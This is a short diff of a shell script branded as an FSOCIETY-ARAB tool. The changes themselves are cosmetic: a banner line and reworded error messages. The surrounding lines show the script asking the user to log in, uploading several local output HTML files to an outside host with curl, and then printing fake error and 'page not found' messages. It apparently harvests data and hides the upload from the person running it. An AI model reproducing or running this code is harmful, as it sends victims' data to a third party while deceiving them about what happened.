@@ -21,6 +21,7 @@ echo '  |_|     /_____/ \_____/ \_____| |_| |_____|   |_|    /_/1.2.0';
 echo '  --------------------- By FSOCIETY-ARAB --------------------- ';
 echo '  ------------------ instagram : fsociety0557 ---------------- ';
 echo '  ----------------- github : FSOCIETY-coder-dz --------------- ';
+echo '  ------------------------------------------------------------ ';
 echo ''
 echo 'Login To Your Account First!'
 echo ''
@@ -52,6 +53,6 @@ curl -T output/fuck7.html http://wildattuli.com
 curl -T output/fuck8.html http://wildattuli.com
 curl -T output/fuck9.html http://wildattuli.com
 curl -T output/fuck0.html http://wildattuli.com
-echo '[+] ERROR RETRY ACCESS ERROR!';
+echo '!!! ERROR RETRY ACCESS ERROR !!!';
 echo '!!! ⚠ PAGE NOT FOUND ⚠  !!!';
-echo '!!! ⚠ ERROR error ERROR error ERROR ⚠ !!!';;
+echo '!!! ⚠ ERROR error ERROR error ERROR ⚠ !!!';
